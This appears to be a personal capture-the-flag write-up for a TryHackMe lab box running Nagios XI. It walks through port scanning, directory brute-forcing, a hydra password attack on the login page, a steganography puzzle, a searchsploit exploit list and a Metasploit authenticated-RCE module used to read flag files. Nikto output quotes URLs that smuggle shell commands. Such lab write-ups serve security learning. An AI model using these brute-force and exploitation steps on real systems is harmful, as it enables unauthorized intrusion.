@@ -1,0 +1,479 @@
+Name: Nax
+Date: 25/02/2022
+Difficulty: Medium
+Description: Identify the critical security flaw in the most powerful and trusted network monitoring software on the market, that allows an user authenticated execute remote code execution.
+Better Description: nvm is not an Art Historian, 
+Goals: Be creative and try stuff instead of the beaten path.
+Learnt: Never skip the puzzles in a CTF!
+
+
+################
+Note: used https://medium.com/@savsay/tryhackme-nax-walkthrough-d696a21c1262 - for getting lost and not considering the cicada puzzle
+################
+
+
+root@ip-10-10-18-193:~# nmap -sC -sV -O -T 4 -p- 10.10.208.191
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-02-24 11:33 GMT
+Warning: 10.10.208.191 giving up on port because retransmission cap hit (6).
+Nmap scan report for ip-10-10-208-191.eu-west-1.compute.internal (10.10.208.191)
+Host is up (0.00041s latency).
+Not shown: 65529 closed ports
+PORT     STATE SERVICE    VERSION
+22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 62:1d:d9:88:01:77:0a:52:bb:59:f9:da:c1:a6:e3:cd (RSA)
+|   256 af:67:7d:24:e5:95:f4:44:72:d1:0c:39:8d:cc:21:15 (ECDSA)
+|_  256 20:28:15:ef:13:c8:9f:b8:a7:0f:50:e6:2f:3b:1e:57 (EdDSA)
+25/tcp   open  smtp       Postfix smtpd
+|_smtp-commands: ubuntu.localdomain, PIPELINING, SIZE 10240000, VRFY, ETRN, STARTTLS, ENHANCEDSTATUSCODES, 8BITMIME, DSN, 
+| ssl-cert: Subject: commonName=ubuntu
+| Not valid before: 2020-03-23T23:42:04
+|_Not valid after:  2030-03-21T23:42:04
+|_ssl-date: TLS randomness does not represent time
+80/tcp   open  http       Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+389/tcp  open  ldap       OpenLDAP 2.2.X - 2.3.X
+443/tcp  open  ssl/http   Apache httpd 2.4.18 ((Ubuntu))
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Site doesn't have a title (text/html).
+| ssl-cert: Subject: commonName=192.168.85.153/organizationName=Nagios Enterprises/stateOrProvinceName=Minnesota/countryName=US
+| Not valid before: 2020-03-24T00:14:58
+|_Not valid after:  2030-03-22T00:14:58
+|_ssl-date: TLS randomness does not represent time
+5667/tcp open  tcpwrapped
+MAC Address: 02:3E:07:1E:6F:73 (Unknown)
+Device type: general purpose
+Running: Linux 3.X
+OS CPE: cpe:/o:linux:linux_kernel:3.13
+OS details: Linux 3.13
+Network Distance: 1 hop
+Service Info: Host:  ubuntu.localdomain; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 1464.64 seconds
+
+root@ip-10-10-18-193:~# nmap --script discovery -p 80 389 443 10.10.208.191
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-02-24 12:14 GMT
+Pre-scan script results:
+| targets-asn: 
+|_  targets-asn.asn is a mandatory parameter
+setup_target: failed to determine route to 389 (0.0.1.133)
+setup_target: failed to determine route to 443 (0.0.1.187)
+Nmap scan report for ip-10-10-208-191.eu-west-1.compute.internal (10.10.208.191)
+Host is up (0.00027s latency).
+
+PORT   STATE SERVICE
+80/tcp open  http
+|_http-chrono: Request times for /; avg: 175.43ms; min: 168.84ms; max: 198.13ms
+|_http-comments-displayer: Couldn't find any comments.
+|_http-date: Thu, 24 Feb 2022 12:14:18 GMT; -1s from local time.
+|_http-devframework: Couldn't determine the underlying framework or CMS. Try increasing 'httpspider.maxpagecount' value to spider more pages.
+|_http-errors: Couldn't find any error pages.
+|_http-feed: Couldn't find any feeds.
+| http-headers: 
+|   Date: Thu, 24 Feb 2022 12:14:18 GMT
+|   Server: Apache/2.4.18 (Ubuntu)
+|   Last-Modified: Wed, 25 Mar 2020 03:47:22 GMT
+|   ETag: "534-5a1a5b9ce3fa2"
+|   Accept-Ranges: bytes
+|   Content-Length: 1332
+|   Vary: Accept-Encoding
+|   Connection: close
+|   Content-Type: text/html
+|   
+|_  (Request type: HEAD)
+|_http-mobileversion-checker: No mobile version detected.
+|_http-referer-checker: Couldn't find any cross-domain scripts.
+|_http-security-headers: 
+| http-sitemap-generator: 
+|   Directory structure:
+|     /
+|       Other: 1
+|   Longest directory structure:
+|     Depth: 0
+|     Dir: /
+|   Total files found (by extension):
+|_    Other: 1
+|_http-title: Site doesn't have a title (text/html).
+| http-useragent-tester: 
+|   Status for browser useragent: 200
+|   Allowed User Agents: 
+|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
+|     libwww
+|     lwp-trivial
+|     libcurl-agent/1.0
+|     PHP/
+|     Python-urllib/2.5
+|     GT::WWW
+|     Snoopy
+|     MFC_Tear_Sample
+|     HTTP::Lite
+|     PHPCrawl
+|     URI::Fetch
+|     Zend_Http_Client
+|     http client
+|     PECL::HTTP
+|     Wget/1.13.4 (linux-gnu)
+|_    WWW-Mechanize/1.34
+| http-vhosts: 
+|_127 names had status 200
+|_http-xssed: No previously reported XSS vuln.
+MAC Address: 02:3E:07:1E:6F:73 (Unknown)
+
+Host script results:
+| dns-brute: 
+|   DNS Brute-force hostnames: 
+|_    ns0.eu-west-1.compute.internal - 172.16.0.23
+|_fcrdns: PASS (ip-10-10-208-191.eu-west-1.compute.internal)
+|_ipidseq: All zeros
+|_path-mtu: PMTU == 9001
+
+Nmap done: 1 IP address (1 host up) scanned in 29.89 seconds
+
+# Redid discovery on just port 443 
+
+root@ip-10-10-96-122:~# nmap --script discovery -p 443 10.10.170.254
+
+Starting Nmap 7.60 ( https://nmap.org ) at 2022-02-25 09:10 GMT
+Pre-scan script results:
+| targets-asn: 
+|_  targets-asn.asn is a mandatory parameter
+Nmap scan report for ip-10-10-170-254.eu-west-1.compute.internal (10.10.170.254)
+Host is up (0.00021s latency).
+
+PORT    STATE  SERVICE
+443/tcp closed https
+MAC Address: 02:94:9C:11:78:67 (Unknown)
+
+Host script results:
+| dns-brute: 
+|   DNS Brute-force hostnames: 
+|_    ns0.eu-west-1.compute.internal - 172.16.0.23
+|_fcrdns: PASS (ip-10-10-170-254.eu-west-1.compute.internal)
+|_ipidseq: All zeros
+|_path-mtu: PMTU == 9001
+
+Nmap done: 1 IP address (1 host up) scanned in 17.72 seconds
+
+
+root@ip-10-10-18-193:~# nikto -h 10.10.208.191
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.208.191
++ Target Hostname:    ip-10-10-208-191.eu-west-1.compute.internal
++ Target Port:        80
++ Start Time:         2022-02-24 11:33:56 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ Server leaks inodes via ETags, header found with file /, fields: 0x534 0x5a1a5b9ce3fa2 
++ The anti-clickjacking X-Frame-Options header is not present.
++ Multiple index files found: index.html, index.php
++ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
++ OSVDB-3233: /icons/README: Apache default file found.
++ 6544 items checked: 0 error(s) and 5 item(s) reported on remote host
++ End Time:           2022-02-24 11:34:22 (GMT0) (26 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+root@ip-10-10-18-193:~# gobuster dir -u http://10.10.208.191 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            http://10.10.208.191
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/02/24 11:34:38 Starting gobuster
+===============================================================
+/javascript (Status: 301)
+/nagios (Status: 401)
+/server-status (Status: 403)
+===============================================================
+2022/02/24 11:35:29 Finished
+===============================================================
+
+# commented directory
+root@ip-10-10-18-193:~# curl http://10.10.208.191
+<html>
+<head></head>
+<body>
+<! --/nagiosxi/ --> 
+# leads to login page
+
+root@ip-10-10-18-193:~# nikto -h http://10.10.208.191/nagiosxi/login.php
+- Nikto v2.1.5
+---------------------------------------------------------------------------
++ Target IP:          10.10.208.191
++ Target Hostname:    ip-10-10-208-191.eu-west-1.compute.internal
++ Target Port:        80
++ Start Time:         2022-02-24 12:20:35 (GMT0)
+---------------------------------------------------------------------------
++ Server: Apache/2.4.18 (Ubuntu)
++ Cookie nagiosxi created without the httponly flag
++ Uncommon header 'content-security-policy' found, with contents: frame-ancestors 'self'
++ Uncommon header 'x-frame-options' found, with contents: SAMEORIGIN
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Multiple index files found: index.cfm, index.php, default.asp, index.html, index.shtml, default.aspx, index.htm, default.htm, index.do, index.jhtml, index.pl, index.aspx, index.php3, index.asp, index.cgi
++ Allowed HTTP Methods: OPTIONS, GET, HEAD, POST 
++ DEBUG HTTP verb may show server debugging information. See http://msdn.microsoft.com/en-us/library/e8z01xdh%28VS.80%29.aspx for details.
++ OSVDB-44056: /nagiosxi/login.php/sips/sipssys/users/a/admin/user: SIPS v0.2.2 allows user account info (including password) to be retrieved remotely.
++ OSVDB-3299: /nagiosxi/login.php/forumscalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
++ OSVDB-3299: /nagiosxi/login.php/forumzcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
++ OSVDB-3299: /nagiosxi/login.php/htforumcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
++ OSVDB-3299: /nagiosxi/login.php/vbcalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
++ OSVDB-3299: /nagiosxi/login.php/vbulletincalendar.php?calbirthdays=1&action=getday&day=2001-8-15&comma=%22;echo%20'';%20echo%20%60id%20%60;die();echo%22: Vbulletin allows remote command execution. See http://www.securiteam.com/securitynews/5IP0B203PI.html
++ OSVDB-724: /nagiosxi/login.php/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.  http://ans.gq.nu/ default admin string 'admin:aaLR8vE.jjhss:root@127.0.0.1', password file location 'ans_data/ans.passwd'
++ OSVDB-724: /nagiosxi/login.php/ans/ans.pl?p=../../../../../usr/bin/id|&blah: Avenger's News System allows commands to be issued remotely.
++ 6544 items checked: 2 error(s) and 14 item(s) reported on remote host
++ End Time:           2022-02-24 12:47:57 (GMT0) (1642 seconds)
+---------------------------------------------------------------------------
++ 1 host(s) tested
+
+root@ip-10-10-96-122:~# gobuster dir -u https://10.10.74.14/nagiosxi/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            https://10.10.74.14/nagiosxi/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Timeout:        10s
+===============================================================
+2022/02/25 09:33:41 Starting gobuster
+===============================================================
+/about (Status: 301)
+/images (Status: 301)
+/help (Status: 301)
+/tools (Status: 301)
+/admin (Status: 301)
+/reports (Status: 301)
+/account (Status: 301)
+/includes (Status: 301)
+/backend (Status: 301)
+/db (Status: 301)
+/api (Status: 301)
+/config (Status: 301)
+/views (Status: 301)
+/terminal (Status: 200)
+.. errors..
+[ERROR] 2022/02/25 09:42:14 [!] Get https://10.10.74.14/nagiosxi/1514234: net/http: request canceled (Client.Timeout exceeded while awaiting headers)
+===============================================================
+2022/02/25 09:43:56 Finished
+===============================================================
+
+root@ip-10-10-96-122:~# gobuster dir -u https://10.10.74.14/nagiosxi/ -w /usr/share/wordlists/dirb/big.txt -x php,html -k
+===============================================================
+Gobuster v3.0.1
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
+===============================================================
+[+] Url:            https://10.10.74.14/nagiosxi/
+[+] Threads:        10
+[+] Wordlist:       /usr/share/wordlists/dirb/big.txt
+[+] Status codes:   200,204,301,302,307,401,403
+[+] User Agent:     gobuster/3.0.1
+[+] Extensions:     php,html
+[+] Timeout:        10s
+===============================================================
+2022/02/25 10:07:36 Starting gobuster
+===============================================================
+/.htaccess (Status: 403)
+/.htaccess.php (Status: 403)
+/.htaccess.html (Status: 403)
+/.htpasswd (Status: 403)
+/.htpasswd.php (Status: 403)
+/.htpasswd.html (Status: 403)
+/about (Status: 301)
+/account (Status: 301)
+/admin (Status: 301)
+/api (Status: 301)
+/backend (Status: 301)
+/config (Status: 301)
+/db (Status: 301)
+/help (Status: 301)
+/images (Status: 301)
+/includes (Status: 301)
+/index.php (Status: 302)
+/install.php (Status: 302)
+/login.php (Status: 200)
+/reports (Status: 301)
+/rr.php (Status: 302)
+/terminal (Status: 200)
+/suggest.php (Status: 200)
+/tools (Status: 301)
+/views (Status: 301)
+/upgrade.php (Status: 302)
+===============================================================
+2022/02/25 10:07:47 Finished
+===============================================================
+root@ip-10-10-96-122:~# 
+
+Dirb:
+
+==> DIRECTORY: https://10.10.74.14/nagiosxi/images/social/                                              
++ https://10.10.74.14/nagiosxi/images/Thumbs.db (CODE:200|SIZE:3072)                                    
+                                                                      
+# downloaded DB
+
+ZAP:
+Wildcard Directives /nagiosxi/,  /nagiosxi/login.php ...
+Evidence: frame-ancestors 'self'
+
+The following directives either allow wildcard sources (or ancestors), are not defined, or are overly broadly defined: 
+script-src, script-src-elem, script-src-attr, style-src, style-src-elem, style-src-attr, img-src, connect-src, frame-src, font-src, media-src, object-src, manifest-src, worker-src, prefetch-src, form-action. The directive(s): form-action are among the directives that do not fallback to default-src, missing/excluding them is the same as allowing anything.
+
+Possible XSS call remote http://$attackboxIP:$port/
+
+This box has proved to my the use of running dirb and gobuster in paralell as dirb has auto recursive lookup and the gobuster is fast enough to
+have a high-level overview of the search root directory tree. Research of Nagios: Wikipedia claims "Nagios Core /ˈnɑːɡiːoʊs/, formerly known as Nagios, is a free and open-source computer-software application that monitors systems, networks and infrastructure. Nagios offers monitoring and alerting services for servers, switches, applications and services. It alerts users when things go wrong and alerts them a second time when the problem has been resolved."
+
+
+ubuntu terminal
+https://10.10.74.14/nagiosxi/terminal/
+
+# Seeing as I could not find the picture for the first question went back to root cicada puzzle.
+        Welcome to elements.
+Ag - Hg - Ta - Sb - Po - Pd - Hg - Pt - Lr
+47 - 80 - 73 - 51  - 84 - 46 - 80 - 78 - 103
+
+/PI3T.PNg
+
+root@ip-10-10-96-122:~# exiftool PI3T.PNg 
+ExifTool Version Number         : 10.80
+File Name                       : PI3T.PNg
+Directory                       : .
+File Size                       : 959 kB
+File Modification Date/Time     : 2022:02:25 10:03:33+00:00
+File Access Date/Time           : 2022:02:25 10:03:36+00:00
+File Inode Change Date/Time     : 2022:02:25 10:03:33+00:00
+File Permissions                : rw-r--r--
+File Type                       : PNG
+File Type Extension             : png
+MIME Type                       : image/png
+Image Width                     : 990
+Image Height                    : 990
+Bit Depth                       : 8
+Color Type                      : Palette
+Compression                     : Deflate/Inflate
+Filter                          : Adaptive
+Interlace                       : Noninterlaced
+Palette                         : (Binary data 768 bytes, use -b option to extract)
+Transparency                    : (Binary data 256 bytes, use -b option to extract)
+Artist                          : Piet Mondrian
+Copyright                       : Piet Mondrian, tryhackme 2020
+Image Size                      : 990x990
+Megapixels                      : 0.980
+
+# Big lesson for methodology ! default username and passwords%
+
+nagiosadmin and because PASSW0RD is not the answer tried
+
+hydra -l nagiosadmin -P /usr/share/wordlists/rockyou.txt 10.10.74.14 https-post-form '/nagiosxi/login.php:nsp=3f4defc8a1d4d85c7c5578fc3032db8e8cf7a96c3e46d976e993e6387f092f30&page=auth&debug=&pageopt=login&redirect=%2Fnagiosxi%2Findex.php%3F&username=^USER^&password=^PASS^&loginButton=&nagiosxi=vdp94gfjln40jtbt6au6srbbt1:F=incorrect'
+
+But was too successful meaning probably some anti-bruteforcing, meaning in CTF puzzle logic that look over everything else.
+
+Got stegoveritas, found nothing. After checking: https://medium.com/@savsay/tryhackme-nax-walkthrough-d696a21c1262
+Apparently Piet Mondrian is Dutch Abstract Artist and you can use:
+https://www.bertnase.de/npiet/npiet-execute.php to get the password.
+
+root@ip-10-10-96-122:~# searchsploit nagios XI
+----------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                         |  Path
+----------------------------------------------------------------------- ---------------------------------
+Nagios XI - 'login.php' Multiple Cross-Site Scripting Vulnerabilities  | linux/remote/34507.txt
+Nagios XI - 'tfPassword' SQL Injection                                 | php/remote/38827.txt
+Nagios XI - 'users.php' SQL Injection                                  | multiple/remote/34523.txt
+Nagios XI - Authenticated Remote Command Execution (Metasploit)        | linux/remote/48191.rb
+Nagios XI - Multiple Cross-Site Request Forgery Vulnerabilities        | linux/remote/34431.html
+Nagios XI - Multiple Cross-Site Scripting / HTML Injection Vulnerabili | multiple/remote/36455.txt
+Nagios XI 5.2.6 < 5.2.9 / 5.3 / 5.4 - Chained Remote Root              | php/webapps/44560.py
+Nagios XI 5.2.6-5.4.12 - Chained Remote Code Execution (Metasploit)    | linux/remote/44969.rb
+Nagios XI 5.2.7 - Multiple Vulnerabilities                             | php/webapps/39899.txt
+Nagios XI 5.5.6 - Magpie_debug.php Root Remote Code Execution (Metaspl | linux/remote/47039.rb
+Nagios XI 5.5.6 - Remote Code Execution / Privilege Escalation         | linux/webapps/46221.py
+Nagios XI 5.6.1 - SQL injection                                        | php/webapps/46910.txt
+Nagios XI 5.6.12 - 'export-rrd.php' Remote Code Execution              | php/webapps/48640.txt
+Nagios XI 5.6.5 - Remote Code Execution / Root Privilege Escalation    | php/webapps/47299.php
+Nagios XI Chained - Remote Code Execution (Metasploit)                 | linux/remote/40067.rb
+Nagios XI Network Monitor Graph Explorer Component - Command Injection | unix/remote/23227.rb
+----------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+
+# This is just a long list telling my I don't have an API key, but I wanted to check the something I remember seeing in the dirb output
+# about versioning to get version inforamtion thought why not practice some ffuf
+
+root@ip-10-10-96-122:~# ffuf -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt -u https://10.10.74.14/nagiosxi/api/v1/FUZZ -mc all
+
+        /'___\  /'___\           /'___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v1.3.1
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : https://10.10.74.14/nagiosxi/api/v1/FUZZ
+ :: Wordlist         : FUZZ: /usr/share/wordlists/SecLists/Discovery/Web-Content/common-api-endpoints-mazen160.txt
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 40
+ :: Matcher          : Response status: all
+________________________________________________
+
+5.0                     [Status: 200, Size: 32, Words: 4, Lines: 2]
+7                       [Status: 200, Size: 32, Words: 4, Lines: 2]
+admin                   [Status: 200, Size: 32, Words: 4, Lines: 2]
+address                 [Status: 200, Size: 32, Words: 4, Lines: 2]
+...... more no key you lose.....
+v7                      [Status: 200, Size: 32, Words: 4, Lines: 2]
+widget                  [Status: 200, Size: 32, Words: 4, Lines: 2]
+:: Progress: [174/174] :: Job [1/1] :: 41 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
+
+reran dirb at /api/ to get this:
+https://10.10.74.14/nagiosxi/api/v1/license
+error   "Unknown API endpoint."
+
+# Before doing the metasploit route, I want to play around with XSS for just attempting
+
+Either use this for urlEncoding or something actually cool like CyberChef.
+import urllib.parse
+
+print("Hello welcome to nvm's urlEncoder script. Please enter a string you wish to encode:\n")
+INPUT = input()
+print(urllib.parse.quote(INPUT))
+exit()
+
+
+# The PoC says: %22;alert%281%29; # %22 is ; and then javascript payload. Didnot work but I tried.
+Anyway the default route is:
+https://www.exploit-db.com/exploits/48191
+
+# Was unsuccesful
+
+Either download and install new metasploit on AttackBox or Kalibox with: :(
+apt update; apt install metasploit-framework
+apt install gem;
+apt-get upgrade;
+bundle install;
+# Check out my github for updating the attackbox for use that does not waste your time!
+
+exploit/linux/http/nagios_xi_plugins_check_plugin_authenticated_rce
+set password $found_password_from_stego
+set rhost
+set lhost
+# dont change the lport
+cat /home/galand/user.txt
+cat /root/root.txt
+                   
